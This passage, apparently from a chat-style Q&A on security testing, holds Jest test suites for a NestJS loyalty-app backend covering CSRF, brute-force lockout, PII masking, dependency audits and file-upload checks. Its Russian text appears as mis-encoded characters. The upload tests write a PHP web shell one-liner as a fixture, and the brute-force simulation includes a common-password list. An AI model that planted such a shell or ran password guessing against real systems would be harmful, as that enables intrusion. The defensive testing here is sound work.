  // Test 8: CSRF protection on all state-changing methods
  it('should protect POST, PATCH, PUT, DELETE', async () => {
    const token = generateGuestToken();
    const methods = ['POST', 'PATCH', 'PUT', 'DELETE'];

    for (const method of methods) {
      const response = await request(app.getHttpServer())
        [method.toLowerCase()]('/api/v1/guest/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ firstName: 'Test' })
        .expect(403);

      expect(response.body.message).toContain('CSRF');
    }

    console.log('โ CSRF protection on all state-changing methods');
  });

  // Test 9: CSRF exemption for API tokens (machine-to-machine)
  it('should exempt API tokens from CSRF protection', async () => {
    const apiToken = generateApiToken(); // Machine-to-machine token

    // API tokens should bypass CSRF (not browser-based)
    await request(app.getHttpServer())
      .post('/api/v1/webhooks/transaction')
      .set('Authorization', `Bearer ${apiToken}`)
      .send({
        posCheckId: 'CHK-123',
        checkAmount: 1000,
        guestPhone: '+79991234567',
      })
      .expect(200); // No CSRF token required

    console.log('โ API tokens exempt from CSRF protection');
  });

  // Test 10: SameSite Cookie Attribute
  it('should set SameSite cookie attribute', async () => {
    const token = generateGuestToken();

    const response = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const cookies = response.headers['set-cookie'];
    const csrfCookie = cookies.find((c: string) => c.includes('XSRF-TOKEN'));

    expect(csrfCookie).toContain('SameSite=Strict');
    console.log('โ SameSite=Strict cookie attribute set');
  });
});

function generateGuestToken(): string {
  return jwt.sign(
    { userId: `user-${Date.now()}`, role: 'GUEST', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}

function generateApiToken(): string {
  return jwt.sign(
    { clientId: 'pos-system', type: 'API_TOKEN' },
    process.env.JWT_SECRET
  );
}
```


***

### **36. Rate Limiting - ะฑััััะพัั ะทะฐัะธัะฐ?**

**ะะพะฝัะตะบัั:** Login endpoint ะฟะพะดะฒะตัะถะตะฝ ะฑััััะพััั.

**ะะพะฟัะพั:** Security tests?

- A) Send 5 login attempts โ all succeed
- B) Send 10 login attempts โ ะฟะพัะปะตะดะฝะธะต ะทะฐะฑะปะพะบะธัะพะฒะฐะฝั (429)
- C) B + ะฟัะพะฒะตัะธัั account lockout ะฟะพัะปะต N failed attempts
- D) C + ะฟัะพะฒะตัะธัั exponential backoff

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- ะััััะพัั = ัะฐััะฐั ะฐัะฐะบะฐ ะฝะฐ login
- Account lockout ะบัะธัะธัะตะฝ ะดะปั security
- Exponential backoff ะทะฐะผะตะดะปัะตั ะฐัะฐะบัััะตะณะพ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/security/brute-force.security.spec.ts
describe('Brute Force Protection', () => {
  let app: INestApplication;
  let redis: Redis;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    redis = app.get('REDIS');
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(async () => {
    await redis.flushall(); // Clear rate limit counters
  });

  // Test 1: Normal Login Attempts (Under Limit)
  it('should allow 5 login attempts', async () => {
    const phone = '+79991234567';

    for (let i = 0; i < 5; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401); // Wrong password, but not rate limited
    }

    console.log('โ 5 login attempts allowed');
  });

  // Test 2: Rate Limiting After 10 Attempts
  it('should rate limit after 10 failed login attempts', async () => {
    const phone = '+79991234567';

    // First 10 attempts should return 401 (unauthorized)
    for (let i = 0; i < 10; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    // 11th attempt should be rate limited
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'wrong-password' })
      .expect(429);

    expect(response.body.message).toContain('Too many requests');
    expect(response.headers['retry-after']).toBeDefined();

    console.log('โ Rate limited after 10 attempts');
  });

  // Test 3: Account Lockout After Failed Attempts
  it('should lock account after 10 failed attempts', async () => {
    const phone = '+79991234567';

    // 10 failed attempts
    for (let i = 0; i < 10; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    // Even with correct password, account should be locked
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'correct-password' })
      .expect(423); // 423 Locked

    expect(response.body.message).toContain('locked');
    expect(response.body.lockedUntil).toBeDefined();

    console.log('โ Account locked after 10 failed attempts');
  });

  // Test 4: Exponential Backoff
  it('should implement exponential backoff', async () => {
    const phone = '+79991234567';
    const delays: number[] = [];

    for (let i = 0; i < 15; i++) {
      const startTime = Date.now();

      const response = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' });

      const delay = Date.now() - startTime;
      delays.push(delay);

      if (response.status === 429) {
        const retryAfter = parseInt(response.headers['retry-after']);
        console.log(`Attempt ${i + 1}: Rate limited, retry after ${retryAfter}s`);

        // Wait before next attempt
        await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
      }
    }

    console.log('=== Exponential Backoff ===');
    console.log(`Delays: ${delays.join('ms, ')}ms`);

    // Delays should increase exponentially
    expect(delays[12]).toBeGreaterThan(delays[5] * 2);
  });

  // Test 5: IP-Based Rate Limiting
  it('should rate limit by IP address', async () => {
    const ip1 = '192.168.1.100';
    const ip2 = '192.168.1.101';

    // IP1: exhaust rate limit
    for (let i = 0; i < 10; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .set('X-Forwarded-For', ip1)
        .send({ phone: '+79991111111', password: 'wrong' })
        .expect(401);
    }

    // IP1: rate limited
    await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .set('X-Forwarded-For', ip1)
      .send({ phone: '+79991111111', password: 'wrong' })
      .expect(429);

    // IP2: not rate limited
    await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .set('X-Forwarded-For', ip2)
      .send({ phone: '+79992222222', password: 'wrong' })
      .expect(401); // Not rate limited

    console.log('โ IP-based rate limiting working');
  });

  // Test 6: Reset Counter on Successful Login
  it('should reset failed attempts counter on success', async () => {
    const phone = '+79991234567';

    // 5 failed attempts
    for (let i = 0; i < 5; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    // Successful login
    await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'correct-password' })
      .expect(200);

    // Counter should be reset (can do 10 more attempts)
    for (let i = 0; i < 10; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    console.log('โ Failed attempts counter reset on success');
  });

  // Test 7: CAPTCHA After N Failed Attempts
  it('should require CAPTCHA after 5 failed attempts', async () => {
    const phone = '+79991234567';

    // 5 failed attempts
    for (let i = 0; i < 5; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    // 6th attempt should require CAPTCHA
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'wrong-password' })
      .expect(403);

    expect(response.body.message).toContain('CAPTCHA');
    expect(response.body.captchaRequired).toBe(true);

    console.log('โ CAPTCHA required after 5 failed attempts');
  });

  // Test 8: Distributed Brute Force (Multiple IPs)
  it('should detect distributed brute force', async () => {
    const phone = '+79991234567';

    // Attack from 10 different IPs (2 attempts each)
    for (let ip = 1; ip <= 10; ip++) {
      for (let attempt = 0; attempt < 2; attempt++) {
        await request(app.getHttpServer())
          .post('/api/v1/auth/login')
          .set('X-Forwarded-For', `192.168.1.${ip}`)
          .send({ phone, password: 'wrong-password' })
          .expect(401);
      }
    }

    // Total 20 attempts on same phone number
    // Should trigger distributed attack detection
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .set('X-Forwarded-For', '192.168.1.100')
      .send({ phone, password: 'correct-password' })
      .expect(423); // Account locked

    expect(response.body.message).toContain('suspicious activity');

    console.log('โ Distributed brute force detected');
  });

  // Test 9: Notification on Suspicious Activity
  it('should send alert on brute force attempt', async () => {
    const phone = '+79991234567';
    const notificationService = app.get('NotificationService');

    jest.spyOn(notificationService, 'send');

    // 10 failed attempts (triggers alert)
    for (let i = 0; i < 10; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    // Verify notification sent
    expect(notificationService.send).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'SECURITY_ALERT',
        message: expect.stringContaining('suspicious login attempts'),
      })
    );

    console.log('โ Security alert sent on brute force');
  });

  // Test 10: Automated Brute Force Testing
  it('should simulate automated brute force attack', async () => {
    const phone = '+79991234567';
    const passwords = [
      '123456', 'password', '12345678', 'qwerty', '123456789',
      'password1', 'abc123', '111111', '1234567', 'dragon',
    ];

    let successCount = 0;
    let blockedCount = 0;

    for (const password of passwords) {
      const response = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password });

      if (response.status === 200) {
        successCount++;
      } else if (response.status === 429 || response.status === 423) {
        blockedCount++;
      }
    }

    console.log('=== Brute Force Simulation ===');
    console.log(`Passwords tried: ${passwords.length}`);
    console.log(`Successful: ${successCount}`);
    console.log(`Blocked: ${blockedCount}`);

    expect(blockedCount).toBeGreaterThan(0);
  });
});
```


***

ะัะพะดะพะปะถะฐั ั ะฟะพัะปะตะดะฝะธะผะธ 4 ะฒะพะฟัะพัะฐะผะธ (37-40) Security Testing? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

### **37. Sensitive Data Exposure - PII ะทะฐัะธัะฐ?**

**ะะพะฝัะตะบัั:** ะะพะณะธ ะฝะต ะดะพะปะถะฝั ัะพะดะตัะถะฐัั phone numbers, card numbers.

**ะะพะฟัะพั:** Security tests?

- A) Check logs ะดะปั phone numbers
- B) Check database encryption (at rest)
- C) B + check TLS/HTTPS (in transit)
- D) C + check data masking ะฒ API responses

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- PII ะฒ ะปะพะณะฐั = GDPR violation
- Encryption at rest + in transit ะพะฑัะทะฐัะตะปัะฝั
- Data masking ะฒ API responses ะทะฐัะธัะฐะตั ะพั ัะปััะฐะนะฝะพะน ััะตัะบะธ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/security/sensitive-data.security.spec.ts
describe('Sensitive Data Exposure Protection', () => {
  let app: INestApplication;
  let logCapture: string[] = [];

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();

    // Capture logs for testing
    const logger = app.get('Logger');
    const originalLog = logger.log;
    const originalError = logger.error;

    logger.log = jest.fn((...args) => {
      logCapture.push(args.join(' '));
      originalLog.apply(logger, args);
    });

    logger.error = jest.fn((...args) => {
      logCapture.push(args.join(' '));
      originalError.apply(logger, args);
    });

    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(() => {
    logCapture = [];
  });

  // Test 1: Phone Numbers Not Logged
  it('should not log phone numbers in plaintext', async () => {
    const phone = '+79991234567';

    await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'test123' })
      .expect(401); // Wrong password

    // Check logs
    const logsWithPhone = logCapture.filter(log => log.includes(phone));

    console.log('=== Log Analysis ===');
    console.log(`Total logs: ${logCapture.length}`);
    console.log(`Logs with phone number: ${logsWithPhone.length}`);

    if (logsWithPhone.length > 0) {
      console.log('โ๏ธ Phone numbers found in logs:');
      logsWithPhone.forEach(log => console.log(`  ${log}`));
    }

    expect(logsWithPhone).toHaveLength(0);
    console.log('โ Phone numbers not logged');
  });

  // Test 2: Credit Card Masking
  it('should mask credit card numbers in logs', async () => {
    const cardNumber = '4532015112830366'; // Test card

    await request(app.getHttpServer())
      .post('/api/v1/payment/process')
      .send({
        cardNumber,
        cvv: '123',
        expiry: '12/25',
      });

    // Check logs for full card number
    const logsWithCard = logCapture.filter(log => log.includes(cardNumber));

    expect(logsWithCard).toHaveLength(0);

    // Should be masked: ************0366
    const maskedLogs = logCapture.filter(log => log.includes('*******0366'));
    expect(maskedLogs.length).toBeGreaterThan(0);

    console.log('โ Credit card numbers masked in logs');
  });

  // Test 3: Password Not Logged
  it('should never log passwords', async () => {
    const password = 'MySecretPassword123!';

    await request(app.getHttpServer())
      .post('/api/v1/auth/register')
      .send({
        phone: '+79991234567',
        password,
        confirmPassword: password,
      });

    const logsWithPassword = logCapture.filter(log => 
      log.includes(password) || log.includes('password')
    );

    // Should not contain actual password
    const logsWithActualPassword = logCapture.filter(log => log.includes(password));
    expect(logsWithActualPassword).toHaveLength(0);

    console.log('โ Passwords not logged');
  });

  // Test 4: Data Masking in API Response
  it('should mask phone numbers in API responses', async () => {
    const token = generateAdminToken();

    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Phone numbers should be masked: +7999***4567
    const guests = response.body.data;
    for (const guest of guests) {
      expect(guest.phone).toMatch(/^\+\d{4}\*{3}\d{4}$/);
      expect(guest.phone).not.toMatch(/^\+\d{11}$/); // Full phone
    }

    console.log('โ Phone numbers masked in API response');
  });

  // Test 5: Database Encryption at Rest
  it('should encrypt sensitive fields in database', async () => {
    const prisma = app.get(PrismaClient);

    // Create user with sensitive data
    const user = await prisma.user.create({
      data: {
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
        guestProfile: {
          create: {
            firstName: 'John',
            passportNumber: '1234 567890', // Sensitive!
          },
        },
      },
    });

    // Query raw database
    const rawUser = await prisma.$queryRaw<any[]>`
      SELECT * FROM "User" WHERE id = ${user.id}
    `;

    const rawProfile = await prisma.$queryRaw<any[]>`
      SELECT * FROM "GuestProfile" WHERE "userId" = ${user.id}
    `;

    // Check if passport number is encrypted in DB
    expect(rawProfile[0].passportNumber).not.toBe('1234 567890');
    expect(rawProfile[0].passportNumber).toMatch(/^[a-f0-9]{32,}$/); // Encrypted hash

    console.log('โ Sensitive fields encrypted in database');
  });

  // Test 6: TLS/HTTPS Enforced
  it('should enforce HTTPS for all requests', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    // Check security headers
    expect(response.headers['strict-transport-security']).toBeDefined();
    expect(response.headers['strict-transport-security']).toContain('max-age=');

    console.log('โ HSTS header set (HTTPS enforced)');
  });

  // Test 7: JWT Token Not Logged
  it('should not log JWT tokens', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Check logs for full token
    const logsWithToken = logCapture.filter(log => log.includes(token));

    expect(logsWithToken).toHaveLength(0);

    // Should be masked: Bearer ey...***
    const maskedLogs = logCapture.filter(log => log.includes('Bearer ey') && log.includes('***'));
    
    console.log('โ JWT tokens not logged in plaintext');
  });

  // Test 8: PII Redaction in Error Messages
  it('should redact PII from error messages', async () => {
    const phone = '+79991234567';

    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'wrong' })
      .expect(401);

    // Error message should not contain phone number
    expect(response.body.message).not.toContain(phone);
    expect(response.body.message).not.toContain('9991234567');

    console.log('โ PII redacted from error messages');
  });

  // Test 9: Database Connection String Not Exposed
  it('should not expose database credentials', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    // Check if any response contains DB credentials
    expect(response.text).not.toContain(process.env.DATABASE_URL);
    expect(response.text).not.toContain('postgresql://');

    // Check logs
    const logsWithDbUrl = logCapture.filter(log => 
      log.includes('postgresql://') || log.includes(process.env.DATABASE_URL)
    );

    expect(logsWithDbUrl).toHaveLength(0);

    console.log('โ Database credentials not exposed');
  });

  // Test 10: Data Minimization in Responses
  it('should return only necessary fields', async () => {
    const token = generateGuestToken();

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/profile')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Should NOT include sensitive internal fields
    expect(response.body).not.toHaveProperty('passwordHash');
    expect(response.body).not.toHaveProperty('refreshToken');
    expect(response.body).not.toHaveProperty('internalId');

    console.log('โ Data minimization applied');
  });

  // Test 11: Audit Logs for PII Access
  it('should log access to PII', async () => {
    const token = generateAdminToken();

    await request(app.getHttpServer())
      .get('/api/v1/admin/guests/user-1')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Check audit log
    const auditLog = await prisma.auditLog.findFirst({
      where: {
        action: 'PII_ACCESS',
        targetId: 'user-1',
      },
    });

    expect(auditLog).toBeTruthy();
    expect(auditLog.userId).toBe('admin-1');
    expect(auditLog.metadata).toMatchObject({
      fields: expect.arrayContaining(['phone', 'passportNumber']),
    });

    console.log('โ PII access logged in audit trail');
  });

  // Test 12: Email Masking
  it('should mask email addresses in responses', async () => {
    const token = generateAdminToken();

    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/users')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const users = response.body.data;
    for (const user of users) {
      if (user.email) {
        // Email should be masked: j***@example.com
        expect(user.email).toMatch(/^[a-z]\*{3}@/);
      }
    }

    console.log('โ Email addresses masked');
  });
});

function generateGuestToken(): string {
  return jwt.sign(
    { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}

function generateAdminToken(): string {
  return jwt.sign(
    { userId: 'admin-1', role: 'ADMIN', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}
```


***

### **38. Dependency Vulnerabilities - npm audit?**

**ะะพะฝัะตะบัั:** Third-party packages ะผะพะณัั ะธะผะตัั ััะทะฒะธะผะพััะธ.

**ะะพะฟัะพั:** Security tests?

- A) Manual `npm audit`
- B) Automated `npm audit` ะฒ CI/CD
- C) B + ะฟัะพะฒะตัะธัั Snyk/Dependabot alerts
- D) C + automated dependency updates ั tests

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Dependency vulnerabilities = ัะฐััะฐั ะฟัะธัะธะฝะฐ breaches
- Automated scanning ะฝะฐัะพะดะธั ััะทะฒะธะผะพััะธ ัะฐะฝะพ
- Automated updates ะดะตัะถะฐั dependencies ะฐะบััะฐะปัะฝัะผะธ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/security/dependencies.security.spec.ts
import { execSync } from 'child_process';

describe('Dependency Vulnerability Scanning', () => {
  // Test 1: npm audit (no critical vulnerabilities)
  it('should have no critical vulnerabilities', () => {
    let auditOutput: string;

    try {
      auditOutput = execSync('npm audit --json', { encoding: 'utf8' });
    } catch (error) {
      auditOutput = error.stdout.toString();
    }

    const audit = JSON.parse(auditOutput);

    console.log('=== npm audit Results ===');
    console.log(`Total vulnerabilities: ${audit.metadata.vulnerabilities.total}`);
    console.log(`  Info: ${audit.metadata.vulnerabilities.info}`);
    console.log(`  Low: ${audit.metadata.vulnerabilities.low}`);
    console.log(`  Moderate: ${audit.metadata.vulnerabilities.moderate}`);
    console.log(`  High: ${audit.metadata.vulnerabilities.high}`);
    console.log(`  Critical: ${audit.metadata.vulnerabilities.critical}`);

    // Fail if critical vulnerabilities found
    expect(audit.metadata.vulnerabilities.critical).toBe(0);

    // Warn if high vulnerabilities found
    if (audit.metadata.vulnerabilities.high > 0) {
      console.warn(`โ๏ธ ${audit.metadata.vulnerabilities.high} high severity vulnerabilities found`);
    }
  });

  // Test 2: Check for outdated packages
  it('should not have severely outdated packages', () => {
    const outdatedOutput = execSync('npm outdated --json || true', { encoding: 'utf8' });

    if (!outdatedOutput.trim()) {
      console.log('โ All packages up to date');
      return;
    }

    const outdated = JSON.parse(outdatedOutput);
    const severelyOutdated: string[] = [];

    for (const [pkg, info] of Object.entries(outdated as any)) {
      const current = info.current.split('.').map(Number);
      const latest = info.latest.split('.').map(Number);

      // Major version behind
      if (latest[0] > current[0]) {
        severelyOutdated.push(`${pkg}: ${info.current} -> ${info.latest}`);
      }
    }

    console.log('=== Outdated Packages ===');
    if (severelyOutdated.length > 0) {
      console.log('โ๏ธ Severely outdated packages:');
      severelyOutdated.forEach(pkg => console.log(`  - ${pkg}`));
    } else {
      console.log('โ No severely outdated packages');
    }

    // Fail if more than 10 major versions behind
    expect(severelyOutdated.length).toBeLessThan(10);
  });

  // Test 3: Known Vulnerable Packages
  it('should not use known vulnerable packages', () => {
    const knownVulnerable = [
      'event-stream@3.3.6', // Malicious code
      'eslint-scope@3.7.2', // Compromised
      'flatmap-stream@0.1.1', // Malicious
      'lodash@4.17.11', // Prototype pollution
    ];

    const packageJson = require('../../../package.json');
    const allDeps = {
      ...packageJson.dependencies,
      ...packageJson.devDependencies,
    };

    const found: string[] = [];

    for (const vuln of knownVulnerable) {
      const [pkg, version] = vuln.split('@');
      if (allDeps[pkg] === version) {
        found.push(vuln);
      }
    }

    if (found.length > 0) {
      console.error('โ๏ธ Known vulnerable packages found:');
      found.forEach(pkg => console.error(`  - ${pkg}`));
    }

    expect(found).toHaveLength(0);
  });

  // Test 4: Snyk Vulnerability Scan
  it('should pass Snyk security scan', async () => {
    try {
      const snykOutput = execSync('snyk test --json', { encoding: 'utf8' });
      const snykResult = JSON.parse(snykOutput);

      console.log('=== Snyk Scan Results ===');
      console.log(`Vulnerabilities: ${snykResult.vulnerabilities?.length || 0}`);

      const critical = snykResult.vulnerabilities?.filter(v => v.severity === 'critical') || [];
      const high = snykResult.vulnerabilities?.filter(v => v.severity === 'high') || [];

      console.log(`  Critical: ${critical.length}`);
      console.log(`  High: ${high.length}`);

      expect(critical.length).toBe(0);
    } catch (error) {
      console.log('โ๏ธ Snyk not configured or scan failed');
    }
  });

  // Test 5: License Compliance
  it('should only use approved licenses', () => {
    const approvedLicenses = [
      'MIT',
      'Apache-2.0',
      'BSD-2-Clause',
      'BSD-3-Clause',
      'ISC',
      'CC0-1.0',
      'Unlicense',
    ];

    const licenseChecker = require('license-checker');

    return new Promise((resolve, reject) => {
      licenseChecker.init(
        {
          start: process.cwd(),
          production: true,
        },
        (err, packages) => {
          if (err) {
            reject(err);
            return;
          }

          const violations: string[] = [];

          for (const [pkg, info] of Object.entries(packages as any)) {
            const license = info.licenses;
            
            if (!approvedLicenses.includes(license)) {
              violations.push(`${pkg}: ${license}`);
            }
          }

          console.log('=== License Compliance ===');
          if (violations.length > 0) {
            console.log('โ๏ธ Unapproved licenses:');
            violations.forEach(v => console.log(`  - ${v}`));
          } else {
            console.log('โ All licenses approved');
          }

          // Warn but don't fail (some licenses might be acceptable)
          if (violations.length > 0) {
            console.warn(`Found ${violations.length} packages with unapproved licenses`);
          }

          resolve(null);
        }
      );
    });
  });

  // Test 6: SBOM (Software Bill of Materials) Generation
  it('should generate SBOM', () => {
    const sbomOutput = execSync('npm ls --json --all', { encoding: 'utf8' });
    const sbom = JSON.parse(sbomOutput);

    const sbomPath = path.join(__dirname, '../../../sbom.json');
    fs.writeFileSync(sbomPath, JSON.stringify(sbom, null, 2));

    console.log(`โ SBOM generated: ${sbomPath}`);

    expect(fs.existsSync(sbomPath)).toBe(true);
  });

  // Test 7: Typosquatting Detection
  it('should detect potential typosquatting', () => {
    const packageJson = require('../../../package.json');
    const allDeps = Object.keys({
      ...packageJson.dependencies,
      ...packageJson.devDependencies,
    });

    const suspiciousPatterns = [
      /^[a-z]{1,3}$/, // Very short names
      /\d{5,}/, // Lots of numbers
      /[^\w-]/, // Special characters
    ];

    const suspicious: string[] = [];

    for (const dep of allDeps) {
      for (const pattern of suspiciousPatterns) {
        if (pattern.test(dep)) {
          suspicious.push(dep);
          break;
        }
      }
    }

    console.log('=== Typosquatting Detection ===');
    if (suspicious.length > 0) {
      console.log('โ๏ธ Suspicious package names:');
      suspicious.forEach(pkg => console.log(`  - ${pkg}`));
    } else {
      console.log('โ No suspicious packages detected');
    }
  });

  // Test 8: Check for Deprecated Packages
  it('should not use deprecated packages', async () => {
    const packageJson = require('../../../package.json');
    const allDeps = {
      ...packageJson.dependencies,
      ...packageJson.devDependencies,
    };

    const deprecated: string[] = [];

    for (const [pkg, version] of Object.entries(allDeps)) {
      try {
        const npmInfo = execSync(`npm view ${pkg}@${version} deprecated --json`, {
          encoding: 'utf8',
        });

        if (npmInfo.trim() && npmInfo !== 'null') {
          deprecated.push(`${pkg}@${version}: ${npmInfo.trim()}`);
        }
      } catch (error) {
        // Package not found or no deprecation info
      }
    }

    console.log('=== Deprecated Packages ===');
    if (deprecated.length > 0) {
      console.log('โ๏ธ Deprecated packages found:');
      deprecated.forEach(pkg => console.log(`  - ${pkg}`));
    } else {
      console.log('โ No deprecated packages');
    }

    expect(deprecated.length).toBeLessThan(5);
  });
});
```

**CI/CD Integration (GitHub Actions):**

```yaml
# .github/workflows/security.yml
name: Security Checks

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]
  schedule:
    - cron: '0 0 * * 0' # Weekly

jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'
      
      - name: Install dependencies
        run: npm ci
      
      - name: npm audit
        run: npm audit --audit-level=critical
      
      - name: Snyk Security Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      
      - name: OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'max-loyalty'
          path: '.'
          format: 'HTML'
      
      - name: Upload Dependency Check Report
        uses: actions/upload-artifact@v3
        with:
          name: dependency-check-report
          path: reports

  dependabot:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Enable Dependabot
        run: |
          echo "Dependabot configured in .github/dependabot.yml"
```

**Dependabot Config:**

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
    
    # Auto-merge minor and patch updates
    ignore:
      - dependency-name: "*"
        update-types: ["version-update:semver-major"]
```


***

### **39. File Upload Security - malicious files?**

**ะะพะฝัะตะบัั:** Admin ะทะฐะณััะถะฐะตั CSV ั transaction data.

**ะะพะฟัะพั:** Security tests?

- A) Upload CSV โ check file extension
- B) Upload malicious file (exe, php) โ reject
- C) B + virus scan (ClamAV)
- D) C + check for zip bombs, CSV injection

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- File extension ะฟัะพะฒะตัะบะฐ ะปะตะณะบะพ ะพะฑัะพะดะธััั
- Virus scanning ะพะฑัะทะฐัะตะปะตะฝ
- Zip bombs ะธ CSV injection = ัะฐัััะต ะฐัะฐะบะธ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/security/file-upload.security.spec.ts
describe('File Upload Security', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: File Extension Validation
  it('should reject disallowed file extensions', async () => {
    const token = generateAdminToken();

    const maliciousExtensions = [
      'evil.exe',
      'hack.php',
      'virus.bat',
      'malware.sh',
      'exploit.js',
    ];

    for (const filename of maliciousExtensions) {
      const filePath = path.join(__dirname, filename);
      fs.writeFileSync(filePath, 'malicious content');

      const response = await request(app.getHttpServer())
        .post('/api/v1/admin/upload')
        .set('Authorization', `Bearer ${token}`)
        .attach('file', filePath)
        .expect(400);

      expect(response.body.message).toContain('Invalid file type');

      fs.unlinkSync(filePath);
    }

    console.log(`โ Blocked ${maliciousExtensions.length} malicious extensions`);
  });

  // Test 2: MIME Type Validation
  it('should validate MIME type (not just extension)', async () => {
    const token = generateAdminToken();

    // Create PHP file disguised as CSV
    const filePath = path.join(__dirname, 'fake.csv');
    fs.writeFileSync(filePath, '<?php system($_GET["cmd"]); ?>');

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(400);

    expect(response.body.message).toContain('Invalid file type');

    fs.unlinkSync(filePath);
    console.log('โ MIME type validation working');
  });

  // Test 3: File Size Limit
  it('should enforce file size limit', async () => {
    const token = generateAdminToken();

    // Create 101MB file (exceeds 100MB limit)
    const filePath = path.join(__dirname, 'large.csv');
    const stream = fs.createWriteStream(filePath);
    
    for (let i = 0; i < 101; i++) {
      stream.write('x'.repeat(1024 * 1024)); // 1MB
    }
    stream.end();

    await new Promise(resolve => stream.on('finish', resolve));

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(413); // Payload Too Large

    expect(response.body.message).toContain('File too large');

    fs.unlinkSync(filePath);
    console.log('โ File size limit enforced');
  });

  // Test 4: Virus Scanning (ClamAV)
  it('should scan files for viruses', async () => {
    const token = generateAdminToken();

    // EICAR test file (safe virus test signature)
    const eicarSignature = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
    const filePath = path.join(__dirname, 'eicar.txt');
    fs.writeFileSync(filePath, eicarSignature);

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
